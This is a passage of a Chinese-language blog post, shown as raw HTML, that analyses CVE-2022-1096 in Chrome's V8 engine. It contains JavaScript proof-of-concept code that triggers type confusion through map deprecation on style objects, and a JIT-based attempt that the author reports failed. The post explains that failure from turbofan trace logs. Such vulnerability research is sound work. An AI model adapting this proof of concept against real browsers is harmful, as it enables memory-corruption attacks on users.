	<span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="c1">// 2. 创建一个包含 double(HeapNumber) 类型的 confuzion 属性的新 map                                             </span>
		<span class="nx">s1</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">double_value</span><span class="p">;</span>                                
	<span class="p">}</span>                                                             
<span class="p">};</span>                                                              

<span class="c1">// 1. 创建一个包含 SMI类型的 deprecate 属性的新 map </span>
<span class="nx">s1</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">smi_value</span><span class="p">;</span>                    
<span class="c1">// 3. 创建一个包含 object 类型的 confuzion 属性的新 map</span>
<span class="nx">s1</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">v1</span><span class="p">;</span>                                              

<span class="kd">var</span> <span class="nx">s2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>                     
<span class="kd">var</span> <span class="nx">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>                                       
<span class="nx">v2</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span>  <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>      
	<span class="c1">// 5. 搜索到 2 中创建好的 map</span>
	<span class="nx">s2</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">double_value</span><span class="p">;</span>
	<span class="c1">// 6. deprecate 属性的类型从 SMI 泛化到了 HeapNumber，创建新 map 替代 </span>
	<span class="c1">// 1. 2. 3. 创建的 map，并且把旧 map 被标记为 deprecate                                  </span>
	<span class="nx">s1</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">double_value</span><span class="p">;</span>                                  
<span class="p">};</span>                                                              

<span class="c1">// 4.搜索到 1. 中创建好的 map</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">smi_value</span><span class="p">;</span>     
<span class="c1">// 7. 发现 s2 目前的 map 已经被标记为 deprecated，先更新到 6. 中创建的新 map，然后又以 </span>
<span class="c1">// confuzion 属性名，搜索新 map，还是搜索到 6. 中创建的新 map，也是 s1 目前在用的 map</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">;</span>                                              

<span class="nx">alert</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">cvs</span><span class="p">.</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">s2</span><span class="p">.</span><span class="nx">confuzion</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>              
</code></pre></div></div>

<p>再来分析一下目前都可以控制哪些东西，s1.confuzion 的类型是完全可控的，s2.confuzion 我认为是不太可控的，为了触发漏洞 s2.confuzion 一定要是个包含 toString 函数的对象，这意味着它一定要是 HeapObject 类型的。</p>

<hr />
<p>⚠️ 提示：这块只是我自己的理解，不一定对，也许有什么我不知道的特性让非 HeapObject 类型的值也可以有自定义的 toString 回调。</p>

<hr />

<p>之前分析过 CVE-2021-30551 的思路是，让 s2.confuzion 是一个浮点数，s1.confuzion 是一个数组，就可以把写入 s2.confuzion 的浮点数，当作数组的地址使用。但这个漏洞 s2.confuzion 一定要是 HeapObject，我就想到是不是可以选择浮点数数组，然后让 s1.confuzion 是对象数组。回顾一下上面的 WriteField 函数，对象的写入由 FastPropertyAtPut 函数完成，就是把对象的指针存储到属性中，这个赋值操作并不能直接触发类型混淆，需要结合上 JIT 编译生成的代码才行。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">JSObject</span><span class="o">::</span><span class="n">FastPropertyAtPut</span><span class="p">(</span><span class="n">FieldIndex</span> <span class="n">index</span><span class="p">,</span> <span class="n">Object</span> <span class="n">value</span><span class="p">,</span>
                                 <span class="n">WriteBarrierMode</span> <span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">index</span><span class="p">.</span><span class="n">is_inobject</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">RawFastInobjectPropertyAtPut</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">UPDATE_WRITE_BARRIER</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
    <span class="n">property_array</span><span class="p">().</span><span class="n">set</span><span class="p">(</span><span class="n">index</span><span class="p">.</span><span class="n">outobject_array_index</span><span class="p">(),</span> <span class="n">value</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">JSObject</span><span class="o">::</span><span class="n">RawFastInobjectPropertyAtPut</span><span class="p">(</span><span class="n">FieldIndex</span> <span class="n">index</span><span class="p">,</span> <span class="n">Object</span> <span class="n">value</span><span class="p">,</span>
                                            <span class="n">WriteBarrierMode</span> <span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">index</span><span class="p">.</span><span class="n">is_inobject</span><span class="p">());</span>
  <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">index</span><span class="p">.</span><span class="n">offset</span><span class="p">();</span>
  <span class="n">RELAXED_WRITE_FIELD</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
  <span class="n">CONDITIONAL_WRITE_BARRIER</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>基本思路是定义一个读取参数对象的 confusion[0] 的函数，然后用 s1 触发这个函数的 JIT 编译，之后以 s2 为参数调用 JIT 编译好的函数，如果没有触发 deoptimize 的话，s2.confusion 就会被当作对象数组使用，而实际上它是一个浮点数数组，数组里存储的内容都是可控的。</p>

<p>先用下面的代码测试下：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="o">*</span> <span class="k">as</span> <span class="nx">cvs</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./module/conversion.mjs</span><span class="dl">'</span>

<span class="kd">const</span> <span class="nx">smi_value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">double_value</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{},</span> <span class="p">{}];</span>

<span class="kd">var</span> <span class="nx">s1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">v1</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nx">s1</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>

<span class="nx">s1</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">smi_value</span><span class="p">;</span>
<span class="nx">s1</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">v1</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">s2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
<span class="nx">v2</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span>  <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">s2</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">;</span>
	<span class="nx">s1</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">double_value</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">s2</span><span class="p">.</span><span class="nx">deprecate</span> <span class="o">=</span> <span class="nx">smi_value</span><span class="p">;</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">confuzion</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">jit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">confuzion</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">jit</span><span class="p">(</span><span class="nx">s1</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">alert</span><span class="p">(</span><span class="nx">jit</span><span class="p">(</span><span class="nx">s2</span><span class="p">));</span>
</code></pre></div></div>

<p>不出意外的结果是不行，alert 弹窗输出了正确的浮点值 1.1，下面我分析一下为什么不行。我对 turbofan 的整个编译过程虽然不是一无所知吧，但是可以说是一窍不通。所以我采用的分析方案就是抓取 trace log 和 CVE-2021-30551 的进行对比，找到它们的区别。</p>

<p>抓取 trace log 需要指定命令行 <code class="language-plaintext highlighter-rouge">./chrome.exe --no-sandbox --enable-logging=stderr --js-flags="--trace-turbo"</code>。</p>

<p>简单对比之后我发现，主要的区别在 V8.TFInlining 阶段。jit 函数很简单，访问对象的属性 confuzion 以及访问数组的 [0] 元素两个操作，分别对应 IR 图中的 JSLoadNamed 和 JSLoadProperty 两个节点。对于 CVE-2021-30551 的 EXP，这两个节点在 V8.TFInlining 阶段满足了优化的条件，都被替换成了更底层的内存加载操作 LoadFiled、LoadElement。而对于本次的 EXP JSLoadNamed 节点没有满足优化条件，仍然保持是 JSLoadNamed，这个区别就使得直接导致类型混淆的 CheckMaps 优化的条件没有被满足，编译生成的代码在访问 confuzion[0] 还是会检查 confuzion 的 map 是否满足条件，不会触发类型混淆。</p>

<p>![[Pasted image 20221213233338.png]]</p>

<p>![[Pasted image 20221213233416.png]]</p>

<hr />
<p>⚠️ 提示：如果不理解这里，需要回忆一下 CVE-2021-30551 的 利用过程，有关键的一步是 JSLoadNamed 和 JSLoadElements 两个节点 Inline 后得到的两个 ChecksMaps 被优化编译器认为是重复的，第二个在优化过程中被删掉了。如果第二个 CheckMaps 一直保留的话，程序运行过程中，就能正确的识别出 obj.confuzion 的类型与预期不匹配，走入 deoptimize 的流程，避免类型混淆的发生。详情可以参考<a href="2022-04-30-CVE-2021-30551">我之前对 CVE-2021-30551 的分析</a>。</p>

<hr />

  </div><div id="disqus_thread"></div>
  <script>
    var disqus_config = function () {
      this.page.url = '';
      this.page.identifier = 'https://pwntips.github.io/2022/11/26/CVE-2022-1096.html';
    };

    (function() {
      var d = document, s = d.createElement('script');

      s.src = 'https://PwnTips.disqus.com/embed.js';

      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript><a class="u-url" href="/2022/11/26/CVE-2022-1096.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="https://pwntips.github.io/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p>Tips &amp; Tricks</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
